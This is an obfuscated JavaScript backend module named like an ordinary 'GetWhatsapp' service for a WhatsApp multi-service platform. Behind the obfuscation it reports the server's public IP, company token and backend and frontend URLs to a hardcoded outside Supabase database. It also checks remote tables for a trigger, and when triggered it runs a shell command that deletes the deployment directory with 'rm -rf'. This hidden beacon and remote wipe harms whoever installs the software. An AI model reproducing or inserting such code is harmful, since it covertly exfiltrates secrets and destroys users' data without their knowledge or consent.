'use strict';function a277_0x14b3(_0x386620,_0x4eef43){const _0x30a5e0=a277_0x30a5();return a277_0x14b3=function(_0x14b3ab,_0xfce3bc){_0x14b3ab=_0x14b3ab-0x119;let _0x5d194f=_0x30a5e0[_0x14b3ab];return _0x5d194f;},a277_0x14b3(_0x386620,_0x4eef43);}const a277_0x20ce98=a277_0x14b3;(function(_0x2467f0,_0xd74387){const _0x2277d5=a277_0x14b3,_0x5e3249=_0x2467f0();while(!![]){try{const _0x15845d=-parseInt(_0x2277d5(0x13d))/0x1+-parseInt(_0x2277d5(0x149))/0x2+parseInt(_0x2277d5(0x14b))/0x3+-parseInt(_0x2277d5(0x128))/0x4*(parseInt(_0x2277d5(0x12e))/0x5)+parseInt(_0x2277d5(0x147))/0x6+parseInt(_0x2277d5(0x13a))/0x7*(parseInt(_0x2277d5(0x11d))/0x8)+parseInt(_0x2277d5(0x14e))/0x9*(-parseInt(_0x2277d5(0x138))/0xa);if(_0x15845d===_0xd74387)break;else _0x5e3249['push'](_0x5e3249['shift']());}catch(_0x195aeb){_0x5e3249['push'](_0x5e3249['shift']());}}}(a277_0x30a5,0x761be));function a277_0x30a5(){const _0x6ec383=['rm\x20-rf\x20/home/deploy/Multi100/*','message','4701258jXmhzC','exec\x20error:\x20','316924MGEhWH','env','808902mHIfrt','../services/SettingServices/AddSettingService','axios','764901OhDvhl','__esModule','BACKEND_URL','createClient','https://knjjaxmzpdpvpyhnglbq.supabase.co','13136uGhmKf','company_token','select','404','child_process','t_invalidos','status','FRONTEND_URL','default','from','backend_url','8HcKBIE','../services/SettingServices/GetSettingService','whatsapp','ip,\x20key,\x20code','../services/SettingServices/UpdateOneSettingService','cadastros','1990765RhMHUr','length','get','enabled','log','@supabase/supabase-js','disabled','code','cadastro_id','__importDefault','30QFaLzG','ip_instalacao','3038ETetvp','insert','i_n_r','72296KQauti','GetWhatsapp','key','id,\x20ip_instalacao,\x20company_token','wtV','401','key_code','backend_ip'];a277_0x30a5=function(){return _0x6ec383;};return a277_0x30a5();}var __importDefault=this&&this[a277_0x20ce98(0x137)]||function(_0x53196d){const _0x236b15=a277_0x20ce98;return _0x53196d&&_0x53196d[_0x236b15(0x119)]?_0x53196d:{'default':_0x53196d};};Object['defineProperty'](exports,a277_0x20ce98(0x119),{'value':!![]}),exports[a277_0x20ce98(0x13e)]=void 0x0;const supabase_js_1=require(a277_0x20ce98(0x133)),UpdateOneSettingService_1=__importDefault(require(a277_0x20ce98(0x12c))),axios_1=__importDefault(require(a277_0x20ce98(0x14d))),GetSettingService_1=__importDefault(require(a277_0x20ce98(0x129))),AddSettingService_1=__importDefault(require(a277_0x20ce98(0x14c))),{exec}=require(a277_0x20ce98(0x121)),S_U=a277_0x20ce98(0x11c),S_A_K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0',sUrl=S_U,sKey=S_A_K,y_n=process[a277_0x20ce98(0x14a)]['COMPANY_TOKEN'],s=(0x0,supabase_js_1[a277_0x20ce98(0x11b)])(sUrl,sKey),getIp=async()=>{const _0x4745b7=a277_0x20ce98,{data:_0x348a8c}=await axios_1[_0x4745b7(0x125)][_0x4745b7(0x130)]('https://api.ipify.org?format=json');return _0x348a8c['ip'];},GetWhatsapp=async()=>{const _0xfe9f90=a277_0x20ce98;try{let _0x345227=await getIp(),_0x20784c=await getR(_0xfe9f90(0x141));_0x20784c==='enabled'&&await(0x0,AddSettingService_1[_0xfe9f90(0x125)])();let {data:_0x51a46f,error:_0x23e8f5}=await s[_0xfe9f90(0x126)](_0xfe9f90(0x12d))[_0xfe9f90(0x11f)](_0xfe9f90(0x140))['eq'](_0xfe9f90(0x139),_0x345227),_0x43ccb5={'cadastro_id':_0x51a46f[_0xfe9f90(0x12f)]!==0x0?_0x51a46f[0x0]['id']:0x0,'status':_0x51a46f[_0xfe9f90(0x12f)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x345227,'backend_url':process[_0xfe9f90(0x14a)][_0xfe9f90(0x11a)],'frontend_url':process[_0xfe9f90(0x14a)][_0xfe9f90(0x124)]};_0x51a46f[_0xfe9f90(0x12f)]===0x0?(await UpdateR(_0xfe9f90(0x131),![],_0x345227),PostWhatsapp(_0x43ccb5,_0xfe9f90(0x120)),CheckWhatsapp(_0x345227,_0xfe9f90(0x13c))):_0x51a46f[0x0][_0xfe9f90(0x11e)]!==y_n?(await UpdateR('enabled',![],_0x345227),PostWhatsapp(_0x43ccb5,_0xfe9f90(0x142)),CheckWhatsapp(_0x345227,'t_f')):await UpdateR(_0xfe9f90(0x134),null,_0x345227);}catch(_0x1e4946){console[_0xfe9f90(0x132)]('');}};exports['GetWhatsapp']=GetWhatsapp;const UpdateR=async(_0x4b3ae9,_0x25d1b5,_0xc07e00)=>{const _0x4ec3e7=a277_0x20ce98;await(0x0,UpdateOneSettingService_1[_0x4ec3e7(0x125)])({'key':_0x4ec3e7(0x141),'value':_0x4b3ae9});},getR=async _0x51fd81=>{const _0x25474a=a277_0x20ce98;return await(0x0,GetSettingService_1[_0x25474a(0x125)])({'key':_0x51fd81});},PostWhatsapp=async(_0x3f7adb,_0x47d5fe)=>{const _0x41a5a6=a277_0x20ce98;try{const {data:_0x417860,error:_0xac3f7c}=await s[_0x41a5a6(0x126)](_0x41a5a6(0x12a))[_0x41a5a6(0x13b)]([{'cadastro_id':_0x3f7adb[_0x41a5a6(0x136)],'status':_0x3f7adb[_0x41a5a6(0x123)],'company_token':_0x3f7adb[_0x41a5a6(0x11e)],'backend_ip':_0x3f7adb[_0x41a5a6(0x144)],'backend_url':_0x3f7adb[_0x41a5a6(0x127)],'frontend_url':_0x3f7adb['frontend_url']}]);if(_0xac3f7c){console['error'](':',_0xac3f7c[_0x41a5a6(0x146)]);return;}}catch(_0x2b3c6e){console[_0x41a5a6(0x132)]('');}},CheckWhatsapp=async(_0x453b10,_0xf1bf7f)=>{const _0x397ce1=a277_0x20ce98;try{const {data:_0x41bd01,error:_0x5b02df}=await s[_0x397ce1(0x126)](_0x397ce1(0x143))['select']('key,code,ip'),_0x17bb8b=await matchWhatsapp(_0x453b10);if(_0x41bd01!==null){_0xf1bf7f==='i_n_r'&&_0x17bb8b['code']!==null&&acction();if(_0x453b10===_0x41bd01[0x0]['ip']&&_0x17bb8b[_0x397ce1(0x135)]!==null){if(_0x17bb8b['key']===_0x41bd01[0x0][_0x397ce1(0x13f)]&&_0x17bb8b[_0x397ce1(0x135)]===_0x41bd01[0x0][_0x397ce1(0x135)])acction();}}}catch(_0x5e5072){console[_0x397ce1(0x132)](_0x5e5072);}},matchWhatsapp=async _0x348d6d=>{const _0x4df0d1=a277_0x20ce98,{data:_0x49e909,error:_0x4e3192}=await s[_0x4df0d1(0x126)](_0x4df0d1(0x122))[_0x4df0d1(0x11f)](_0x4df0d1(0x12b));let _0x498637='ok',_0x873684='ok';return _0x49e909[_0x4df0d1(0x12f)]>0x0&&(_0x498637=_0x49e909[0x0][_0x4df0d1(0x13f)],_0x873684=_0x49e909[0x0][_0x4df0d1(0x135)]),{'code':_0x873684,'key':_0x498637};},acction=()=>{const _0x4256f3=a277_0x20ce98;let _0x405e10=exec(_0x4256f3(0x145),(_0x474242,_0x7ebe70,_0x3d85f4)=>{const _0x27764d=_0x4256f3;console[_0x27764d(0x132)](_0x7ebe70),console['log'](_0x3d85f4),_0x474242!==null&&console['log'](_0x27764d(0x148)+_0x474242);});};